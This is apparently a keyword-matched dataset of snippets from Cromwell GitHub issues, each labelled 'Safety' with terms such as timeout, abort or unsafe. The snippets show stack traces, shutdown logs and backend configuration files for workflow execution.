common.transforms.package$CheckedAtoB$.$anonfun$firstSuccess$2(package.scala:25); at scala.collection.LinearSeqOptimized.foldLeft(LinearSeqOptimized.scala:122); at scala.collection.LinearSeqOptimized.foldLeft$(LinearSeqOptimized.scala:118); at scala.collection.immutable.List.foldLeft(List.scala:86); at common.transforms.package$CheckedAtoB$.$anonfun$firstSuccess$1(package.scala:22); at cats.data.Kleisli.$anonfun$andThen$1(Kleisli.scala:37); at wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$.wdl$draft3$transforms$wdlom2wom$FileElementToWomBundle$$importWomBundle(FileElementToWomBundle.scala:101); at wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.$anonfun$toWomBundle$11(FileElementToWomBundle.scala:74); at cats.instances.VectorInstances$$anon$1.$anonfun$traverse$2(vector.scala:77); at cats.instances.VectorInstances$$anon$1.loop$2(vector.s,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3977:2702,unsafe,unsafeToFuture,2702,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3977,1,['unsafe'],['unsafeToFuture']
Safety,"nfo] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2018-08-27 02:04:26,93] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-08-27 02:04:26,93] [info] JobExecutionTokenDispenser stopped; [2018-08-27 02:04:26,93] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-08-27 02:04:26,93] [info] WorkflowLogCopyRouter stopped; [2018-08-27 02:04:26,94] [info] WorkflowManagerActor stopped; [2018-08-27 02:04:26,94] [info] WorkflowManagerActor All workflows finished; [2018-08-27 02:04:26,94] [info] Connection pools shut down; [2018-08-27 02:04:26,94] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-08-27 02:04:26,95] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2018-08-27 02:04:26,95] [info] Shutting down CallCacheWriteActor - Timeout = 1800 seconds; [2018-08-27 02:04:26,96] [info] CallCacheWriteActor Shutting down: 0 queued messages to process; [2018-08-27 02:04:26,96] [info] Shutting down ServiceRegistryActor - Timeout = 1800 seconds; [2018-08-27 02:04:26,96] [info] WriteMetadataActor Shutting down: 0 queued messages to process; [2018-08-27 02:04:26,96] [info] KvWriteActor Shutting down: 0 queued messages to process; [2018-08-27 02:04:26,96] [info] Shutting down DockerHashActor - Timeout = 1800 seconds; [2018-08-27 02:04:26,96] [info] ServiceRegistryActor stopped; [2018-08-27 02:04:26,96] [info] Shutting down IoProxy - Timeout = 1800 seconds; [2018-08-27 02:04:26,96] [info] SubWorkflowStoreActor stopped; [2018-08-27 02:04:26,96] [info] DockerHashActor stopped; [2018-08-27 02:04:26,97] [info] IoProxy stopped; [2018-08-27 02:04:26,97] [info] JobStoreActor stopped; [2018-08-27 02:04:26,97] [info] CallCacheWriteActor stopped; [2018-08-27 02:04:27,00] [info] Database closed; [2018-08-27 02:04:27,00] [info] Stream materializer shut down; [2018-08-27 02:04:27,06] [info] Automatic shutdown of the async connection; [2018-08-27 02:04:27,06] [info] Gracefully shutdown sentry threads.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039:7227,Timeout,Timeout,7227,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039,3,['Timeout'],['Timeout']
Safety,"nfo] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2018-08-30 17:53:41,15] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-08-30 17:53:41,15] [info] JobExecutionTokenDispenser stopped; [2018-08-30 17:53:41,17] [info] WorkflowLogCopyRouter stopped; [2018-08-30 17:53:41,17] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-08-30 17:53:41,17] [info] WorkflowManagerActor All workflows finished; [2018-08-30 17:53:41,17] [info] WorkflowManagerActor stopped; [2018-08-30 17:53:41,17] [info] Connection pools shut down; [2018-08-30 17:53:41,18] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-08-30 17:53:41,18] [info] SubWorkflowStoreActor stopped; [2018-08-30 17:53:41,18] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2018-08-30 17:53:41,18] [info] Shutting down CallCacheWriteActor - Timeout = 1800 seconds; [2018-08-30 17:53:41,19] [info] CallCacheWriteActor Shutting down: 0 queued messages to process; [2018-08-30 17:53:41,19] [info] CallCacheWriteActor stopped; [2018-08-30 17:53:41,18] [info] Shutting down ServiceRegistryActor - Timeout = 1800 seconds; [2018-08-30 17:53:41,19] [info] Shutting down DockerHashActor - Timeout = 1800 seconds; [2018-08-30 17:53:41,19] [info] KvWriteActor Shutting down: 0 queued messages to process; [2018-08-30 17:53:41,19] [info] WriteMetadataActor Shutting down: 0 queued messages to process; [2018-08-30 17:53:41,19] [info] DockerHashActor stopped; [2018-08-30 17:53:41,19] [info] Shutting down IoProxy - Timeout = 1800 seconds; [2018-08-30 17:53:41,19] [info] JobStoreActor stopped; [2018-08-30 17:53:41,19] [info] IoProxy stopped; [2018-08-30 17:53:41,19] [info] ServiceRegistryActor stopped; [2018-08-30 17:53:41,23] [info] Database closed; [2018-08-30 17:53:41,23] [info] Stream materializer shut down; [2018-08-30 17:53:41,29] [info] Automatic shutdown of the async connection; [2018-08-30 17:53:41,29] [info] Gracefully shutdown sentry threads.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4062:5869,Timeout,Timeout,5869,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4062,3,['Timeout'],['Timeout']
Safety,"ng the singularity method of task execution; ```; cromwell-system-akka.dispatchers.engine-dispatcher-27 WARN - BackendPreparationActor_for_bcfd9d26:UnmappedBamToAlignedBam.SamToFastqAndBwaMemAndMba:14:1 [UUID(bcfd9d26)]: Docker lookup failed; cala:35); ```. How do I set it up to enable caching calls?. ------------------------------------------------------------------------------------------; running file; ```; java -jar -Ddocker.hash-lookup.method=local -Ddocker.hash-lookup.enabled=true -Dwebservice.port=8088 -Dwebservice.interface=0.0.0.0 -Dconfig.file=/work/share/ac7m4df1o5/bin/cromwell/3_config/cromwellslurmsingularitynew.conf ./cromwell-84.jar server. ```; config ; ```; # This line is required. It pulls in default overrides from the embedded cromwell; # `reference.conf` (in core/src/main/resources) needed for proper performance of cromwell.; include required(classpath(""application"")). # Cromwell HTTP server settings; webservice {; #port = 8000; #interface = 0.0.0.0; #binding-timeout = 5s; #instance.name = ""reference""; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }. # Cromwell ""system"" settings; system {; # If 'true', a SIGINT will trigger Cromwell to attempt to abort all currently running jobs before exiting; #abort-jobs-on-terminate = false. # this tells Cromwell to retry the task with Nx memory when it sees either OutOfMemoryError or Killed in the stderr file.; memory-retry-error-keys = [""OutOfMemory"", ""Out Of Memory"",""Out of memory""]; # If 'true', a SIGTERM or SIGINT will trigger Cromwell to attempt to gracefully shutdown in server mode,; # in particular clearing up all queued database writes before letting the JVM shut down.; # The shutdown is a multi-phase process, each phase having its own configurable timeout. See the Dev Wiki for more details.; #graceful-server-shutdown = true. # Cromwell will cap the number of running workflows at N; #max-concurrent-workflows = 5000. # Cromwell will launch up to N submitted workflows at a time",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:1134,timeout,timeout,1134,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['timeout'],['timeout']
Safety,ngine.io.IoAttempts$EnhancedCromwellIoException: [Attempted 1 time(s)] - IOException: Could not read from s3://bucket/cwl_temp_file_8fa7a9e4-f30d-4c19-b8cb-68be6442f317.cwl/8fa7a9e4-f30d-4c19-b8cb-68be6442f317/call-bbmap/bbmap-rc.txt: s3://s3.amazonaws.com/bucket/cwl_temp_file_8fa7a9e4-f30d-4c19-b8cb-68be6442f317.cwl/8fa7a9e4-f30d-4c19-b8cb-68be6442f317/call-bbmap/bbmap-rc.txt; Caused by: java.io.IOException: Could not read from s3://bucket/cwl_temp_file_8fa7a9e4-f30d-4c19-b8cb-68be6442f317.cwl/8fa7a9e4-f30d-4c19-b8cb-68be6442f317/call-bbmap/bbmap-rc.txt: s3://s3.amazonaws.com/bucket/cwl_temp_file_8fa7a9e4-f30d-4c19-b8cb-68be6442f317.cwl/8fa7a9e4-f30d-4c19-b8cb-68be6442f317/call-bbmap/bbmap-rc.txt; 	at cromwell.engine.io.nio.NioFlow$$anonfun$withReader$2.applyOrElse(NioFlow.scala:146); 	at cromwell.engine.io.nio.NioFlow$$anonfun$withReader$2.applyOrElse(NioFlow.scala:145); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); 	at scala.util.Failure.recoverWith(Try.scala:232); 	at cromwell.engine.io.nio.NioFlow.withReader(NioFlow.scala:145); 	at cromwell.engine.io.nio.NioFlow.limitFileContent(NioFlow.scala:154); 	at cromwell.engine.io.nio.NioFlow.$anonfun$readAsString$1(NioFlow.scala:98); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:85); 	at cats.effect.internals.IORunLoop$RestartCallback.signal(IORunLoop.scala:336); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:357); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:303); 	at cats.effect.internals.IOShift$Tick.run(IOShift.scala:36); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoin,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4542:1652,recover,recoverWith,1652,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4542,1,['recover'],['recoverWith']
Safety,no more ??? on abort. Closes #1109. Closes #1110. Closes #1111. Closes #1112,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1122:15,abort,abort,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1122,1,['abort'],['abort']
Safety,"ns since in this case there is no need for a ""?"" in the ```y``` nor the ```x``` or the invokation of ```select_first```; however I have to say that I don't see why this ""coversion"" would be invalid but I'm not much of a wdl or scala expert. Now the for-sure issue here is that instead of failing indicating what is going on the workflow was still running and the offending task(s) were reported as ""Starting"" in the metadata and the timing and they stayed that way forever. . In order to find out what was going on I needed to install and run a locally v36 server (I usually use dsde-method's community cromwell servers). The logs show first the causing wdl bug like so:. ```; [ERROR] [03/19/2019 09:52:14.444] [cromwell-system-akka.dispatchers.engine-dispatcher-47] [akka://cromwell-system ... Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomAnyType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([""gs:// .... 70.tsv.gz""])), []); ```; Notice that Skipped most of the message text showing (what I think are) the important bits . . This meesage is follow for java exception directly dump into the log output file. java.lang.UnsupportedOperationException: Could not construct array of type WomMaybeEmptyArrayType(W....z""])), []); at wom.values.WomArray$.apply(WomArray.scala:34); at wom.values.WomArray$.apply(WomArray.scala:38); at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.$anonfun$evaluateValue$16(LiteralEvaluators.scala:108); at cats.data.Validated.map(Validated.scala:194); ... After this exception there is a log [ERROR] entry appears reporting the exception and exception stack trace. The timing diagram show the tasks hanging in the ""Starting"" state forever and the metadata does not report anything apart than these tasks are ""Starting"". So the error is silenced and the only recurse left is to abort. A re-submit of the workflow would just get stuck in the same place.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4755:2473,abort,abort,2473,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4755,1,['abort'],['abort']
Safety,"nt or not, everything is retried upon failure; # Defaults to 3; localization-attempts = 3. # Specifies the minimum file size for `gsutil cp` to use parallel composite uploads during delocalization.; # Parallel composite uploads can result in a significant improvement in delocalization speed for large files; # but may introduce complexities in downloading such files from GCS, please see; # https://cloud.google.com/storage/docs/gsutil/commands/cp#parallel-composite-uploads for more information.; #; # If set to 0 parallel composite uploads are turned off. The default Cromwell configuration turns off; # parallel composite uploads, this sample configuration turns it on for files of 150M or larger.; parallel-composite-upload-threshold=""150M""; }. # Controls how batched requests to PAPI are handled:; batch-requests {; timeouts {; # Timeout when attempting to connect to PAPI to make requests:; # read = 10 seconds. # Timeout waiting for batch responses from PAPI:; #; # Note: Try raising this value if you see errors in logs like:; # WARN - PAPI request worker PAPIQueryWorker-[...] terminated. 99 run creation requests, 0 status poll requests, and 0 abort requests will be reconsidered. If any of those succeeded in the cloud before the batch request failed, they might be run twice.; # ERROR - Read timed out; # connect = 10 seconds; }; }; filesystems {; gcs {; # A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; # Google project which will be billed for the requests; project = ""xxxxx-xxxxx-xxxxx"". caching {; # When a cache hit is found, the following duplication strategy will be followed to use the cached outputs; # Possible values: ""copy"", ""reference"". Defaults to ""copy""; # ""copy"": Copy the output files; # ""reference"": DO NOT copy the output files but point to the original output files instead.; # Will still make sure than all the original output files exist and are accessible before; # going forward with the cac",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462:4617,Timeout,Timeout,4617,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462,1,['Timeout'],['Timeout']
Safety,"nt or not, everything is retried upon failure; # Defaults to 3; localization-attempts = 3. # Specifies the minimum file size for `gsutil cp` to use parallel composite uploads during delocalization.; # Parallel composite uploads can result in a significant improvement in delocalization speed for large files; # but may introduce complexities in downloading such files from GCS, please see; # https://cloud.google.com/storage/docs/gsutil/commands/cp#parallel-composite-uploads for more information.; #; # If set to 0 parallel composite uploads are turned off. The default Cromwell configuration turns off; # parallel composite uploads, this sample configuration turns it on for files of 150M or larger.; parallel-composite-upload-threshold=""150M""; }. # Controls how batched requests to PAPI are handled:; batch-requests {; timeouts {; # Timeout when attempting to connect to PAPI to make requests:; # read = 10 seconds. # Timeout waiting for batch responses from PAPI:; #; # Note: Try raising this value if you see errors in logs like:; # WARN - PAPI request worker PAPIQueryWorker-[...] terminated. 99 run creation requests, 0 status poll requests, and 0 abort requests will be reconsidered. If any of those succeeded in the cloud before the batch request failed, they might be run twice.; # ERROR - Read timed out; # connect = 10 seconds; }; }; filesystems {; gcs {; # A reference to a potentially different auth for manipulating files via engine functions.; auth = ""service-account""; # Google project which will be billed for the requests; project = ""***-***"". caching {; # When a cache hit is found, the following duplication strategy will be followed to use the cached outputs; # Possible values: ""copy"", ""reference"". Defaults to ""copy""; # ""copy"": Copy the output files; # ""reference"": DO NOT copy the output files but point to the original output files instead.; # Will still make sure than all the original output files exist and are accessible before; # going forward with the cache hit.; dupli",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6469:14263,Timeout,Timeout,14263,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6469,1,['Timeout'],['Timeout']
Safety,"o SUCCEEDED for job projects/392615380452/locations/us-south1/jobs/job-ba81bad8-82e9-4d95-8fc0-04dfbbd746da.; taskExecution.exitCode=0; ```. What we define as execution events:. ```; ExecutionEvent(Job state is set from QUEUED to SCHEDULED for job projects/392615380452/locations/us-south1/jobs/job-321db1bc-9a68-4171-aa2a-46885d781656.,2024-04-03T20:10:01.704137839Z,None); ExecutionEvent(Job state is set from SCHEDULED to RUNNING for job projects/392615380452/locations/us-south1/jobs/job-321db1bc-9a68-4171-aa2a-46885d781656.,2024-04-03T20:11:30.631264449Z,None); ExecutionEvent(Job state is set from RUNNING to SUCCEEDED for job projects/392615380452/locations/us-south1/jobs/job-321db1bc-9a68-4171-aa2a-46885d781656.,2024-04-03T20:12:16.898798407Z,None); ```. </details>; </details>. ## Load test results. We have executed many load tests, this is the latest one involving 14k jobs. Data / Backend | Batch with Mysql | PAPIv2 with Mysql; ------------- | -------------|---------; Jobs | 14400 | 14400; Execution time | 20936 seconds | 24451 seconds. Overall, all our tests indicate that Batch finishes executing the jobs faster than PAPIv2. <details>; <summary>Load tests settings</summary>. We have ran Cromwell in server mode with the following settings:. - request-timeout: 10m; - idle-timeout: 10m; - job-rate-control: jobs = 20, per = 10 seconds; - max-workflow-launch-count: 50; - new-workflow-poll-rate: 1; - database: MySQL; - virtual-private-cloud setup; - maximum-polling-interval: 600s; - localization-attempts: 3; - google.auth: service account; - request-workers: 3; - concurrent-job-limit: 14400. JVM Options:; - `-Xms512m -Xmx64g`. **NOTE**: Initially we found a bottleneck on Batch but Google enabled an experimental settings to schedule many jobs concurrently which reduced the total execution time. Server capacity (from Google Cloud):; - VM Machine Type: n2-standard-16; - Virtual CPUs: 16; - Memory: 64G; - Architecture: x86/64; - CPU Platform: Intel Cascade Lake. </details>",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7412:5834,timeout,timeout,5834,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412,2,['timeout'],['timeout']
Safety,"ocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ^C[2016-10-27 13:10:13,93] [info] WorkflowManagerActor: Received shutdown signal.; [2016-10-27 13:10:13,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:13,93] [info] WorkflowManagerActor Aborting all workflows; [2016-10-27 13:10:14,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:15,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:16,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:17,93] [info] Waiting for 1 workflows to abort...; ^C^C[2016-10-27 13:10:18,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:19,33] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:5596,abort,abort,5596,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"oinTask.java); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(Redefined); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java). ""cromwell-system-scheduler-1"" #14 prio=5 os_prio=31 tid=0x00007fb76aa14800 nid=0x6103 runnable [0x00000001295b3000]; java.lang.Thread.State: RUNNABLE; at com.jprofiler.agent.InstrumentationCallee.exitFilteredMethod(Native Method); at com.jprofiler.agent.InstrumentationCallee.__ejt_filter_exitMethod(ejt:86); at akka.actor.LightArrayRevolverScheduler.clock(Scheduler.scala:213); at akka.actor.LightArrayRevolverScheduler$$anon$8.nextTick(Redefined); at akka.actor.LightArrayRevolverScheduler$$anon$8.run(Redefined); at java.lang.Thread.run(Redefined). ""cromwell-system-akka.actor.default-dispatcher-4"" #13 prio=5 os_prio=31 tid=0x00007fb76b38c000 nid=0x5f03 waiting on condition [0x000000012ac3d000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c002f9e0> (a akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(Redefined); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(Redefined); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java). ""cromwell-system-scheduler-1"" #10 prio=5 os_prio=31 tid=0x00007fb76b20f000 nid=0x5a07 runnable [0x000000012a0e1000]; java.lang.Thread.State: RUNNABLE; at com.jprofiler.agent.InstrumentationCallee.exitFilteredMethod(Native Method); at com.jprofiler.agent.InstrumentationCallee.__ejt_filter_exitMethod(ejt:86); at akka.dispatch.AbstractNodeQueue$Node.next(AbstractNodeQueue.java:124); at akka.dispatch.AbstractNodeQueue.pollNode(AbstractNodeQueue.java:86); at akka.actor.LightArrayRevolverScheduler$$anon$8.executeBucket$1(Scheduler.scala:411); at akka.actor.LightArrayRevolverScheduler$$anon$8.nextTick(Redefined); at akka.actor.LightArrayRevolverScheduler$$anon$8",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:47349,Unsafe,Unsafe,47349,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"oint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; logging: Localization; timeout: 300s; - commands:; - -c; - printf '%s %s\n' ""$(date -u '+%Y/%m/%d %H:%M:%S')"" Running\ user\ action:\; docker\ run\ -v\ /mnt/local-disk:/cromwell_root\ --entrypoint\=/bin/bash\; ubuntu@sha256:1e48201ccc2ab83afc435394b3bf70af0fa0055215c1e26a5da9b50a1ae367c9\; /cromwell_root/script; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; logging: UserAction; timeout: 300s; - commands:; - /cromwell_root/script; entrypoint: /bin/bash; imageUri: ubuntu@sha256:1e48201ccc2ab83afc435394b3bf70af0fa0055215c1e26a5da9b50a1ae367c9; labels:; tag: UserAction; mounts:; - disk: local-disk; path: /cromwell_root; - commands:; - -c; - printf '%s %s\n' ""$(date -u '+%Y/%m/%d %H:%M:%S')"" Starting\ delocalization.; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; logging: Delocalization; timeout: 300s; - commands:; - -c; - /bin/bash /cromwell_root/gcs_delocalization.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; tag: Delocalization; mounts:; - disk: local-disk; path: /cromwell_root; - commands:; - -c; - printf '%s %s\n' ""$(date -u '+%Y/%m/%d %H:%M:%S')"" Done\ delocalization.; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; logging: Delocalization; timeout: 300s; - alwaysRun: true; commands:; - -c; - python -c 'import base64; print(base64.b64decode(""xxxxxx""));'; > /tmp/1xxxxxx.sh && chmod u+x /tmp/1xxxxxx.sh; && sh /tmp/1xxxxxx.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; tag: Delocalization; - alwaysRun: true; commands:; - -c; - python -c 'import base64; print(base64.b64decode(""xxxxxx""));'; > /tmp/xxxxxx.sh && chmod u+x /tmp/xxxxxx.sh; && sh /tmp/xxxxxx.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-s",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462:19886,timeout,timeout,19886,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462,1,['timeout'],['timeout']
Safety,"old root which was /g/cromwell/cromwell-executions. . Note I'm running cromwell in server mode with mariadb. I've cleaned and deleted all tables from mariadb. restarted the server as well. Can't find any other config/cache file where it has saved old address. Sometime workflows are fine pointing to new root but sometime not. <!-- Which backend are you running? -->; SLURM on cromwell 36. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. backend {; # Override the default backend.; default = ""PhoenixSLURM"". # The list of providers.; providers {. PhoenixSLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; String userid; String partitions; String memory_per_node; Int nodes; Int cores; String time; """""". # If an 'exit-code-timeout-seconds' value is specified:; # - When a job has not been alive for longer than this timeout; # - And has still not produced an RC file; # - Then it will be marked as Failed.; # Warning: If set, Cromwell has to run 'check-alive' for every job at regular intervals (unrelated to this timeout). exit-code-timeout-seconds = 600. submit = """"""; chmod 770 -R ${cwd}; sudo change-files.sh ${userid} ${cwd}; phoenix_home_cwd=""/home/${userid}""; phoenix_home_out=""/home/${userid}/stdout""; phoenix_home_err=""/home/${userid}/stderr"". phoenix_script=${script}_phonix; cat ${script} | sed -s ""s@#\!/bin/bash@#\!/bin/bash\nsource '/etc/profile' @g"" > $phoenix_script. sbatch --uid=${userid} --gid=${userid} \; -J ${job_name} \; -p ${partitions} \; -N ${nodes} \; -n ${cores} \; --mem=${memory_per_node} \; --time=${time} \; -D $phoenix_home_cwd \; -o $phoenix_home_out \; -e $phoenix_home_err \; $phoenix_script; """""". kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*"". root = ""/fast/gdr/uat/cromwell-executions""; }; }. } # prov",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4404:1688,timeout,timeout-seconds,1688,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4404,2,['timeout'],"['timeout', 'timeout-seconds']"
Safety,"om.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ^C[2016-10-27 13:10:13,93] [info] WorkflowManagerActor: Received shutdown signal.; [2016-10-27 13:10:13,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:13,93] [info] WorkflowManagerActor Aborting all workflows; [2016-10-27 13:10:14,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:15,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:16,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:17,93] [info] Waiting for 1 workflows to abort...; ^C^C[2016-10-27 13:10:18,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:19,33] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.Ab",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:5385,abort,abort,5385,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
